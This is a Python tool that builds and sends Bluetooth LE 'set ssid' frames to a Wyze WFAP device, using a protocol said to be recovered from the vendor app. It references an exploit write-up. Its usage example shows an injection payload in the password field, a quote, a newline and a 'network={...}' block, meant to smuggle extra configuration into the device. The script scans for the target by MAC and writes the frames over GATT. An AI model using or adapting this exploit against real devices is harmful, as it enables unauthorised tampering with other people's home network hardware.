#!/usr/bin/env python3
"""Build (and optionally send) the Wyze WFAP `set ssid` frame over BLE.

Recovered from the vendor app (see docs/exploit/wyze-ble-wfap.md):
  frame  = flags | cmdType | len | checksum | payload
  flags  = (payloadFormat << 4) | (reply << 5) | msgId
  cksum  = sum(payload) & 0xFF
  payload for 0x82 = TLV(tag=10, value=b"s=" + b64(ssid) + b"&p=" + b64(pwd))
  0x80 (no payload) is the ready frame before, and the finish frame after.
Payloads other than cmdType 0xF0 are encrypted by the DeviceAuth2021 session cipher
(/tmp/wfap_crypto.py when present).

  wyze_ble_setssid.py --ssid 'zz' --pwd 'pigsnout"\\nnetwork={...}#' --dry-run
  wyze_ble_setssid.py --ssid ... --pwd ... --send
"""
import argparse
import base64
import struct
import sys

SVC = "0000fd7b-0000-1000-8000-00805f9b34fb"
CHR = "00000001-0000-1000-8000-00805f9b34fb"
CMD_READY = 0x80
CMD_SSID = 0x82
TAG_SSID = 10


def tlv(tag: int, value: bytes) -> bytes:
    return struct.pack("<HH", tag, len(value)) + value


def frame(cmd: int, payload: bytes = b"", msgid: int = 1, reply: bool = False,
          fmt: int = 0) -> bytes:
    if len(payload) > 240:
        raise ValueError("payload exceeds 240-byte unit")
    flags = ((fmt & 0xF) << 4) | ((1 if reply else 0) << 5) | (msgid & 0xF)
    return bytes([flags, cmd, len(payload), sum(payload) & 0xFF]) + payload


def ssid_payload(ssid: str, pwd: str) -> bytes:
    v = b"s=" + base64.b64encode(ssid.encode()) + b"&p=" + base64.b64encode(pwd.encode())
    return tlv(TAG_SSID, v)


def frames(ssid: str, pwd: str, encrypt=None) -> list[bytes]:
    pl = ssid_payload(ssid, pwd)
    if encrypt is not None:
        pl = encrypt(pl)
        if len(pl) > 240:
            raise ValueError("encrypted payload exceeds one unit; fragmentation not implemented")
    return [frame(CMD_READY, b"", 1), frame(CMD_SSID, pl, 2), frame(CMD_READY, b"", 3)]


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--ssid", required=True)
    ap.add_argument("--pwd", required=True)
    ap.add_argument("--mac", help="device MAC, for locating the advertisement")
    ap.add_argument("--dry-run", action="store_true")
    ap.add_argument("--send", action="store_true")
    a = ap.parse_args()

    encrypt = None
    try:
        sys.path.insert(0, "/tmp")
        import wfap_crypto  # type: ignore
        encrypt = wfap_crypto.encrypt
        print("cipher: loaded wfap_crypto")
    except Exception as exc:  # pragma: no cover - optional dependency
        print(f"cipher: absent ({exc.__class__.__name__}); frames are plaintext")

    out = frames(a.ssid, a.pwd, encrypt)
    for f in out:
        print(f.hex())
    if a.dry_run or not a.send:
        return 0

    import asyncio
    from bleak import BleakScanner, BleakClient

    mac = bytes.fromhex(a.mac.replace(":", "")) if a.mac else None

    async def run():
        d = await BleakScanner.discover(timeout=10.0, return_adv=True)
        dev = None
        for _, (dv, adv) in d.items():
            if mac and adv.manufacturer_data.get(2160, b"").endswith(mac):
                dev = dv
                break
        if dev is None:
            print("not advertising")
            return 1
        async with BleakClient(dev) as c:
            for f in out:
                await c.write_gatt_char(CHR, f, response=True)
                await asyncio.sleep(0.4)
        print("sent")
        return 0

    return asyncio.run(run())


if __name__ == "__main__":
    sys.exit(main())
